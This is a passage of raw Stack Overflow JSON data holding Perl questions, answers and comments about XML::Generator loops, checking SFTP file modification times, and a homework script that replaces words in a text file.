"https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494586338, "post_id": 43935867, "comment_id": 74903843, "body": "thank you simbabque"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1494586461, "post_id": 43935867, "comment_id": 74903928, "body": "Yes, I think you may need to backtrack here, and give input data and desired output - I think this can be done better, but without knowing these things I can&#39;t help."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494587597, "post_id": 43935867, "comment_id": 74904695, "body": "Well done on that edit, but you still have a <code>;</code> in the middle of your loop. You can even see that from the way you indented your code (which is good, btw). There&#39;s <code>$gen-&gt;cpu;</code>, followed by an open paren <code>(</code>. This essentially calls <code>$gen-&gt;cpu</code> without args, then creates an empty list that contains a block with one statement in it, which should be a syntax error. You should really turn on <code>use strict</code> and <code>use warnings</code>. You also have <code>@cpuinfo[$r]</code>, which should be <code>$cpuinfo[$r]</code> The sigil needs to refer to what that value is, and array elements are scalars."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1494596800, "last_edit_date": 1494596800, "creation_date": 1494589418, "answer_id": 43937003, "question_id": 43935867, "link": "https://stackoverflow.com/questions/43935867/unable-to-loop-inside-a-call-to-xmlgenerator/43937003#43937003", "title": "Unable to loop inside a call to XML::Generator", "body": "<p></p>\n\n<p>You don't seem to be at all familiar with Perl, and this isn't the place for a tutorial, but most languages don't allow you to put an executable loop inside a parameter list. What you need is a call to <code>map</code>, which \"maps\" one list of data into another. In this case it maps the list of text items in <code>@cpuinfo</code> to a list of <code>XML::Generator</code> objects that each represent a <code>&lt;map&gt;</code> element</p>\n\n<p>Remember that you <em>must always</em> <code>use strict</code> and <code>use warnings 'all'</code> at the top of <em>every</em> Perl program that you write, and declare every variable with <code>my</code> as close as possible to its first point of use, preferably at the point it is defined</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nuse XML::Generator;\n\nmy @cpuinfo = qw/ A B C /;\n\nmy $gen = XML::Generator-&gt;new( escape =&gt; 'always', pretty =&gt; 2 );\n\nmy $xml = $gen-&gt;servers(\n    $gen-&gt;server(\n        $gen-&gt;cpuinfo(\n            map { $gen-&gt;cpu($_) } @cpuinfo\n        )\n    )\n);\n\nprint $xml, \"\\n\";\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;servers&gt;\n  &lt;server&gt;\n    &lt;cpuinfo&gt;\n      &lt;cpu&gt;A&lt;/cpu&gt;\n      &lt;cpu&gt;B&lt;/cpu&gt;\n      &lt;cpu&gt;C&lt;/cpu&gt;\n    &lt;/cpuinfo&gt;\n  &lt;/server&gt;\n&lt;/servers&gt;\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 43937003, "answer_count": 1, "score": 0, "last_activity_date": 1494596800, "creation_date": 1494585952, "last_edit_date": 1494588499, "question_id": 43935867, "link": "https://stackoverflow.com/questions/43935867/unable-to-loop-inside-a-call-to-xmlgenerator", "title": "Unable to loop inside a call to XML::Generator", "body": "<p>I am trying to use a <code>for</code> loop to put each item from array <code>@cpuinfo</code> into a separate <code>&lt;cpu&gt;</code>  element\nin an XML document\nusing <a href=\"https://metacpan.org/pod/XML::Generator\" rel=\"nofollow noreferrer\">XML::Generator</a>.</p>\n\n<pre><code># @cpuinfo contain cpu information of multiple cpu's\nuse XML::Generator;\n\nmy $gen = XML::Generator-&gt;new( 'escape' =&gt; 'always', 'pretty' =&gt; 10 );\n\nmy $xml = $gen-&gt;servers(\n   $gen-&gt;server(\n\n      $gen-&gt;cpuinfo(\n\n         foreach $r (@cpuinfo){\n            $gen-&gt;cpu;\n            (  {  $gen-&gt;cpu( @cpuinfo[$r] );\n               }\n            )\n         }\n\n      )\n   ),\n);\n</code></pre>\n"}, {"tags": ["perl", "net-sftp"], "answers": [{"comments": [{"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 2, "creation_date": 1494607302, "post_id": 43937005, "comment_id": 74917763, "body": "<code>mtime</code> and <code>atime</code> are in Unix time; the number of seconds elapsed since the epoch (00:00:00, 1 January 1970 UTC). I will add a note in the docs explaining it."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1494607394, "post_id": 43937005, "comment_id": 74917818, "body": "@salva sweet, thank you! :) Good to hear from a module author directly."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 4, "last_activity_date": 1494589421, "creation_date": 1494589421, "answer_id": 43937005, "question_id": 43934932, "link": "https://stackoverflow.com/questions/43934932/how-to-find-the-age-of-the-file-in-sftp-using-perl/43937005#43937005", "title": "How to find the age of the file in SFTP using perl?", "body": "<p>You are on the right track. Calling <code>-&gt;stat</code> on the connection object returns a <a href=\"https://metacpan.org/pod/Net::SFTP::Foreign::Attributes\" rel=\"nofollow noreferrer\">Net::SFTP::Foreign::Attributes</a> object. You can then call <code>-&gt;mtime</code> on it to get the modifcation time.</p>\n\n<pre><code>my $attr = $sftp_conn-&gt;stat('/inbox/tested.txt') \n    or die \"remote stat command failed: \".$sftp_conn-&gt;status;\nprint $attr-&gt;mtime;\n</code></pre>\n\n<p>There is no need to create an empty object first. You don't need the following line. You probably copied it from the SYNOPSIS in the docs, but that's just to show different ways of using that module. You can delete it.</p>\n\n<blockquote>\n<pre><code>my $a1 = Net::SFTP::Foreign::Attributes-&gt;new();\n</code></pre>\n</blockquote>\n\n<p>I don't know which format the <code>mtime</code> will be in, so I can't tell you how to do the comparison. There is nothing about that in the docs, in the code of the module or in the tests. </p>\n\n<p>A quick google <a href=\"http://www.nsftools.com/tips/RawFTP.htm#MDTM\" rel=\"nofollow noreferrer\">suggested</a> <em>\"YYYYMMDDhhmmss\"</em>, but that might not be the right one. Just try it. If it's a unix timestamp, you can just compare it to <code>time</code> or <code>time - 3600</code>, but if it's a string, you will need to parse it. <a href=\"https://p3rl.org/Time::Piece\" rel=\"nofollow noreferrer\">Time::Piece</a> is a useful module that comes with the Perl core to do that.</p>\n"}], "owner": {"reputation": 1263, "user_id": 696264, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/c3fa04fd8c4245eac2d015a26674bc18?s=128&d=identicon&r=PG", "display_name": "Madhan", "link": "https://stackoverflow.com/users/696264/madhan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 557, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1494593364, "creation_date": 1494583404, "last_edit_date": 1494593364, "question_id": 43934932, "link": "https://stackoverflow.com/questions/43934932/how-to-find-the-age-of-the-file-in-sftp-using-perl", "title": "How to find the age of the file in SFTP using perl?", "body": "<p>I am connecting SFTP and downloading the file using perl. I want to download the file that is created/modified 1 hours back.</p>\n\n<p>The below is code snippet.</p>\n\n<pre><code>use strict;\nuse Net::SFTP::Foreign;\nmy $sftp_conn=Net::SFTP::Foreign-&gt;new('test.sftp.com',user=&gt;'test',password=&gt;'test123');\nmy $a1 = Net::SFTP::Foreign::Attributes-&gt;new();\nmy $a2 = $sftp_conn-&gt;stat('/inbox/tested.txt') or die \"remote stat command failed: \".$sftp_conn-&gt;status;\n$sftp_conn-&gt;get(\"/inbox/tested.txt\",\"/tmp\"));\n</code></pre>\n\n<p>Here I want to check the file age at what time it modified and calculate in hours.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 1, "creation_date": 1494568213, "post_id": 43929942, "comment_id": 74893062, "body": "@AruneshSingh Using <code>-i</code> seems to directly contradict what OP explicitly stated to need."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494568280, "post_id": 43929942, "comment_id": 74893091, "body": "OP, do you need a separate perl script (as your example implies) or is a commandline one-liner also helpful?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494568340, "post_id": 43929942, "comment_id": 74893121, "body": "Is reading a file and writing to a new file to be done from the script, or can shell redirection be used?"}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494569916, "post_id": 43929942, "comment_id": 74893789, "body": "@Yunnosch, Yes, Then I should remove <code>-i</code> as <code>perl -pe &#39;s&#47;new&#47;old&#47;g&#39; WK5input.txt &gt; newfile.txt</code>"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494610512, "post_id": 43929942, "comment_id": 74919500, "body": "Cannot resist to provide the reference for homework defying get-it-done-somehow: <code>sed &quot;s&#47;new&#47;old&#47;gi&quot; WK5input.txt &gt; output.txt</code>. I hope this is not considered too off-topic, because it illustrates by contrast the special circumstances of homework questions."}], "answers": [{"comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494570140, "post_id": 43930479, "comment_id": 74893896, "body": "Can you explain the parts where you implemented most differently from OPs attempt? It is a homework question (with very visible attempt close to solution)  and therefor needs more explanation than solution."}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494573358, "post_id": 43930479, "comment_id": 74895623, "body": "<i>This is what I have so far but can&#39;t seem to get anywhere. Please help.</i> Already the OP&#39;s attempt very close to the solution obviously they knew what they will tried in the code. So then simply mentioned and I/O operating for OPEN/CLOSE. There is no need for each and every line to explain the code&#39;s. Also OP&#39;s needed to have the solution and where they want to replace the things doing in the replace (I have mentioned the problem)."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 4, "creation_date": 1494579629, "post_id": 43930479, "comment_id": 74899412, "body": "Use lexical variables, not bareword filehandles. Use 3-arg open, never 2-arg open. Always include the name of the script and the file in the open error message. Don&#39;t predeclare variables. Don&#39;t clobber <code>$_</code> for no reason. Your substitution is case sensitive."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1494595029, "post_id": 43930479, "comment_id": 74909550, "body": "Storing all the lines to be printed makes the memory footprint of your program proportional to the size of the input. Programs that do ingest one line and spit it out after modifying will work for arbitrary input. Yours is going to bring the whole system to its knees when faced with large input files. Now, it is sometimes good to accumulate a small number of lines and print only occasionally, but usually the system&#39;s buffering does a good enough job that that is not needed."}], "tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": -2, "last_activity_date": 1494582601, "last_edit_date": 1494582601, "creation_date": 1494569480, "answer_id": 43930479, "question_id": 43929942, "link": "https://stackoverflow.com/questions/43929942/how-to-write-a-program-that-reads-a-text-file-and-substitutes-certain-words-and/43930479#43930479", "title": "How to write a program that reads a text file and substitutes certain words and then outputs the text file under a different name", "body": "<p>Just try this:</p>\n\n<pre><code>use strict;\nuse warnings; \n\nmy $filename = 'WK5input.txt';\n\nopen(my $tmp, \"&lt;\", $filename) or die \"Couldn't able to open a file...: $!\\n\";\nmy $storeline = \"\";\nwhile(my $line = &lt;$tmp&gt;)\n{\n    $line=~s/new/old/g;\n    $storeline .= $line;\n}\n\nopen(my $out, \"&gt;\", \"Output.txt\") or die \"Couldn't able to open a file...: $!\\n\";\nprint $out $storeline;\nclose($out);\nclose($tmp);\n</code></pre>\n\n<p>There is a <em><strong>multiple way</strong></em> to do the task while handling the I/O. This is based on your question/understanding purpose only.</p>\n\n<p>And also you couldn't you the temporarily variable [special variable] once you closed the while loop.</p>\n\n<pre><code> $_ =~ s/new/old/g;\n open( $fh, '&gt;', 'output.txt');\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1494579702, "post_id": 43930535, "comment_id": 74899462, "body": "Don&#39;t predeclare variables. Use 3-arg open, never 2-arg open. Why do you concatenate <code>$filename</code> separately but interpolate <code>$!</code>? Your substitution is case sensitive."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 0, "creation_date": 1494581250, "post_id": 43930535, "comment_id": 74900498, "body": "@fugu Your edit fixed a few things, but you removed the filenames from the error messages (bad) and the substitution is still case sensitive."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1494583334, "post_id": 43930535, "comment_id": 74901896, "body": "As a very minor style point - I prefer <code>print {$out} $row;</code>. There&#39;s a couple of reasons, the major one being: <code>print $out, $row,&quot;\\n&quot;</code> works, but <code>print {$out}, $row, &quot;\\n&quot;</code> is a syntax error."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 0, "creation_date": 1494589235, "post_id": 43930535, "comment_id": 74905717, "body": "@fugu I admit to be unhappy with your edits. Please give a reason for each of your changes. Especially the parts where I left OPs code in a comment, augmented by what happened to it. That I felt more useful for a homework question. Renaming an identifier in a way which keeps it similar to the one used by OP, extended by a distinguishing use-case related part seemed very appropriate to me. Please reason why you changed that. I really interested in your reasons, especially since some of your edits are supported by one of my heros here. But in some cases you went to far without reason."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1494589487, "post_id": 43930535, "comment_id": 74905895, "body": "@melpomene I mainly tried to stay close to OPs homework, in order to get a better benefit for OP in this situation. But I am open to feedback. So why not predeclare variables? In combination with explaining comments (which are admittedly a bit thin here) it seems to make sense to me."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494589807, "post_id": 43930535, "comment_id": 74906079, "body": "I simply missed the case-insensitivity requirement while reading and concentrated at OPs code while writing. That is worth an edit."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494590240, "post_id": 43930535, "comment_id": 74906345, "body": "I concatenated the content of the variable $filename explicitly, becaue I (probably wrongly as I now see from a different angle) has the impression that is what OP intended. I did not care about the fact that and how, OP also used &#180;$!`, which is not necessarily the filename."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494590613, "post_id": 43930535, "comment_id": 74906601, "body": "I will rework the answer, compromising between the good feedback in comments and edit here and my idea to stay close to what OP achieved; for homework-specific helpfulness. Later."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494594041, "post_id": 43930535, "comment_id": 74908931, "body": "Error messages due to <code>open</code> failure should incorporate the name of the file on my the operation had been attempted and indicate the failed operation."}, {"owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 0, "creation_date": 1494597773, "post_id": 43930535, "comment_id": 74911524, "body": "@Yunnosch feel free to roll back my edits any time you want"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 0, "creation_date": 1494600838, "post_id": 43930535, "comment_id": 74913690, "body": "@fugu Thanks for agreeing. But I will actually keep several of your changes. Rolling back is a signal I do not want to send, it would only be appropriate if I didn&#39;t like anything you did."}, {"owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "edited": false, "score": 0, "creation_date": 1494605261, "post_id": 43930535, "comment_id": 74916634, "body": "@Yunnosch I&#39;m not agreeing at all. I&#39;m just saying that you are free accept or reject my edits as you please. Better yet, why don&#39;t you edit your answer so that it represents what you consider to be a better answer?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1494610294, "post_id": 43930535, "comment_id": 74919379, "body": "@melpomene, fugu, sobrique, sinan I did the intended editing. What is still improveable now I have missed. So please comment (again), preferrably including reasons, I am not against also learning something (more) here. Otherwise thanks for the constructive feedback. The other comments (especially the one on &quot;print {$out} $row&quot;) seem to target the edit not by me, let me know if some of them apply to my most recent version."}], "tags": [], "owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "is_accepted": true, "score": 0, "last_activity_date": 1494609560, "last_edit_date": 1494609560, "creation_date": 1494569705, "answer_id": 43930535, "question_id": 43929942, "link": "https://stackoverflow.com/questions/43929942/how-to-write-a-program-that-reads-a-text-file-and-substitutes-certain-words-and/43930535#43930535", "title": "How to write a program that reads a text file and substitutes certain words and then outputs the text file under a different name", "body": "<p>Using various shortcuts (which probably are forbidden for your assignment) you could do:<br>\n<code>perl -pe \"s/new/old/gi\" WK5input.txt &gt; output.txt</code></p>\n\n<p>For the special situation of your homework assignment however, you got reasonably close to the goal, but many little details had to be fixed.<br>\n(Note that I missed one of those details, the case insensitivity. That would not have happened if you had provided appropriate sample input and desired output. You might want to read up on [mcve].)<br>\nI have listed some assumptions on which special side-requirements distinguish your assignment from the usual goal to make an efficient solution.</p>\n\n<p>I intentionally provide a solution here which is as close as possible to your own version, because I believe seeing small changes which make your version work is more helpful to you than the optimised version above. That one is so compact that it completley hides how close you got.<br>\nCheck the other answers for intermediate versions, neither fully optimised nor homework-oriented.\nFor an optimised solution, some people would even skip perl and use awk or, for the purpose of historical brain exercise, sed.</p>\n\n<p>These are a few assumptions on implicit rules,<br>\nwhich I guess you are expected to obey:  </p>\n\n<ul>\n<li>write a perl program which covers all the requirements,<br>\ni.e. no use of shell features, no other tools</li>\n<li>do not use commandline parameters<br>\n(just because you did not in your attempt; maybe you have not covered them in your course yet)  </li>\n<li>use line by line processing<br>\n(just because you did so in your attempt; maybe you have not covered other methods in your course yet)</li>\n<li>do not use \"obscure perl magics\", e.g. the commandline options -pe`,<br>\nthough they otherwise are highly convenient<br>\n(a special case/interpretation of the \"no shell\" rule)</li>\n</ul>\n\n<p>If any of these guessed rules are not applicable to your assignment have a look at the other answers. They provide interesting alternatives.</p>\n\n<pre><code># nice touch, using these is very good practice\nuse strict;\nuse warnings; \n\n# Not necessary, but good practice: collect the \"my\"s in one place soon.\n# This supports self-documenting inside the code.\n# Doing it with the \"my\" at the first use is an aleternative option and preferred by some.\nmy $filename = 'WK5input.txt';  # file name   for the input file\nmy $fhin;                        # file handle for the input file\nmy $fhout;                       # file handle for the output file\nmy $row;                         # variable with currently processed line\n\n# Prefer to use the three parameter version of \"open\", explicitly stating the mode.\nopen($fhin, '&lt;', $filename) # two file handles are needed, use different names\n  or die 'Could not open input  file \"'.$filename.'\" '.$!;\n# I chose to concatenate both variables (file name and failure reason) explicitly,\n# to some text inside '...', which can be more efficiently handled by perl interpreter.\n# This saves work on text inside \"...\" and is more self explaining, i.e. it is easier\n# to understand at the first reading what the code does.\n\n# The second file handle is setup here, to read from input and write to output at the same time.\nopen($fhout, '&gt;', 'output.txt')\n  or die 'Could not open output file output.txt '.$!;\n\nwhile ($row = &lt;$fhin&gt;) { # you are reading into a dedicated variable here ...\n\n  # There was the code \"chomp $row;\" here. \n  # This removes the newline from ther end of the line, if there is one.\n  # It is not needed if you are going to append the newline again before printing.\n\n  $row =~ s/new/old/gi;   # ... you need to use the variable here, instead of \"$_\"\n  # The additional \"i\" behind the \"g\", makes the search for \"new\", \"New\", \"NEW\" case insensitive.\n  # Credits to other answer and comments for finding the requirement I missed.\n\n  # I accept the requirement to replace new-&gt;old, though it seems strange.\n  # I itched to replace old-&gt;new.\n\n  print $fhout $row; # print into the output file instead of to stdout\n  # You had an additional \"\\n\" at the end, which was in fact needed, but only\n  # because of the \"chomp\" a few lines above.\n  # Also, you had the variable in quotes, i.e. \"$row\\n\". That uses some time for interpreting\n  # the text inside the quotes. If you only want to print the content of a variable, then\n  # only print the variable outside of quotes.\n}\n\n# There was the code \"$_ =~ s/new/old/g;\" here, it was moved into the loop.\n# Compare to a different answer to see a solution which used a single global replace on\n# a variable with all the input. Instead, I decided to go for line by line processing in\n# a loop, because it seemed closer to your approach.\n\n# There was the code \"open( $fh, '&gt;', 'output.txt');\" here it was moved to before the loop.\n# There was the code \"print $filename ;\" here. It was deleted, because it seems not to be\n# required by the assignment. Printing the modified content is done line by line inside the\n# loop. \n\n# Closing file handles instead of file name:\nclose $fhin;  \nclose $fhout;\n</code></pre>\n\n<p><em>(StackOverflow recommends not to immediatly provide complete solutions for homework questions.<br>\nI interpret that as \"... for homework questions which are not already close to solution\".<br>\nI provided a solution because I considered your attempt very much close enough.<br>\nClose enough to show you the last details in comparision to something which works. Take that as a compliment.<br>\nStackOverflow also recommends to take students a little further along the way they can already see, in a helpful manner. Providing only the optimised, fine tuned final version, as the one start of this answer, is not constructive for them.<br>\nThis is of course no excuse for any really bad code in my answer, so everybody feel free to point it out. When editing however, please stick to my goal, staying close to OPs attempt.)</em></p>\n"}, {"comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": 